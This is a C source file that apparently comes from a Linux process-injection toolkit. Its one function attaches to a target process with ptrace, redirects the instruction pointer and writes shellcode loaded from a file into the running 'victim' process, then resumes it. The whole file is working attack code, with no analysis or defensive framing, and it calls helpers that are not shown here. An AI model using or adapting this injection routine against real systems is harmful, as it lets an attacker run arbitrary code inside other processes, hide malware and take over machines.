#include "inject_shellcode_hijack_thread.h"

void inject_shellcode_hijack_thread(pid_t target, char* path_to_shellcode){

  dzlog_info("Loading shellcode from %s", path_to_shellcode);
  int size_of_shellcode = 0;
  char* shellcode = read_file(path_to_shellcode, &size_of_shellcode);

  hexdump_shellcode(shellcode, size_of_shellcode);
  
  struct user_regs_struct regs;
  memset(&regs, 0, sizeof(struct user_regs_struct));

  ptrace_attach(target);

  // get registers of victim, find address to write shellcode
  // to and set RIP to this address.
  ptrace_getregs(target, &regs);
  long addr = freespaceaddr(target) + sizeof(long);
  regs.rip = addr + 2;
  ptrace_setregs(target, &regs);

  // write shellcode to victim and continue victim process
  ptrace_write(target, addr, shellcode, size_of_shellcode);
  ptrace_just_cont(target);

  // ToDo: properly detach from victim, ptrace_detach fails.
  //ptrace_detach(target);

  dzlog_info("Finished shellcode injection into PID %i", target);
  
  free(shellcode);
}
